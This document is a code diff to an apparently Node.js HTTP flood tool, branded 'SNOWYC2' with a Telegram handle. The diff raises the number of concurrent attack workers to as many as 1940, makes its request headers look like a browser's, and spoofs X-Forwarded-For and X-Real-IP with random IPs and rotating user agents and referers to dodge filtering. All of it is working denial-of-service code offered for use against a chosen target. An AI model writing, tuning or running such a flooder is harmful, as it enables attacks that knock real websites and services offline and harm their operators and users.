@@ -5,8 +5,8 @@ const http = require('http');
 const https = require('https');
 const process = require('process');
 
+const MAX_CONCURRENT = Math.min(os.cpus().length * 154, 1940); // adjust if needed
 const REQUEST_TIMEOUT = 8000;
-const STATS_INTERVAL = 5000;
 
 function loadLines(filename) {
     try {
@@ -21,9 +21,9 @@ function loadLines(filename) {
 
 const REFERERS = loadLines('refs.txt');
 const USER_AGENTS = loadLines('ua.txt');
+
 const UA_POOL = Array.from({ length: 10000 }, () =>
-    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0'
-);
+    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0');
 
 const keepAliveHttp = new http.Agent({ keepAlive: true });
 const keepAliveHttps = new https.Agent({ keepAlive: true });
@@ -59,7 +59,7 @@ class AttackEngine {
             'Referer': this.getRandomReferer(),
             'X-Forwarded-For': randomIP,
             'X-Real-IP': randomIP,
-            'Accept': '*/*',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
             'Accept-Encoding': 'gzip, deflate, br',
             'Accept-Language': 'en-US,en;q=0.9',
             'Cache-Control': 'no-cache',
@@ -79,16 +79,23 @@ class AttackEngine {
                 httpsAgent: keepAliveHttps,
                 validateStatus: null
             });
-
             if (response.status === 200) {
                 this.stats.success++;
                 return;
             }
         } catch {
-            // Silently fail
+            // ignored
         }
 
         this.stats.errors++;
+    }
+
+    async startWorkers() {
+        const workers = [];
+        for (let i = 0; i < MAX_CONCURRENT; i++) {
+            workers.push(this.workerLoop());
+        }
+        await Promise.all(workers);
     }
 
     async workerLoop() {
@@ -98,35 +105,30 @@ class AttackEngine {
         }
     }
 
-    async startWorkers() {
-        const workerCount = os.cpus().length * 50;
-        const workers = [];
-        for (let i = 0; i < workerCount; i++) {
-            workers.push(this.workerLoop());
-        }
-        await Promise.all(workers);
-    }
-
     async runAttack() {
-        console.clear();
-        console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
-        console.log('  ============================================');
-        console.log(`  TARGET: ${this.target}`);
-        console.log(`  TIME:   ${this.duration / 1000}s`);
-        console.log('  MODE:   CLEAN FLOOD - ADAPTIVE CONCURRENCY');
-        console.log('  ============================================\n');
+        const showIntro = () => {
+            console.clear();
+            console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
+            console.log('  ============================================');
+            console.log(`  TARGET: ${this.target}`);
+            console.log(`  TIME:   ${this.duration / 1000}s`);
+            console.log(`  MODE:   RAPID STRIKE - ${MAX_CONCURRENT} Concurrent`);
+            console.log('  ============================================\n');
+        };
+
+        showIntro();
 
         let lastTotal = 0;
         const printStats = setInterval(() => {
             const elapsed = (Date.now() - this.startTime) / 1000;
-            const currentRps = (this.stats.total - lastTotal) / (STATS_INTERVAL / 1000);
+            const currentRps = (this.stats.total - lastTotal) / 0.2;
             lastTotal = this.stats.total;
             this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);
 
             process.stdout.write(
                 `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
             );
-        }, STATS_INTERVAL);
+        }, 200);
 
         await this.startWorkers();
         this.running = false;
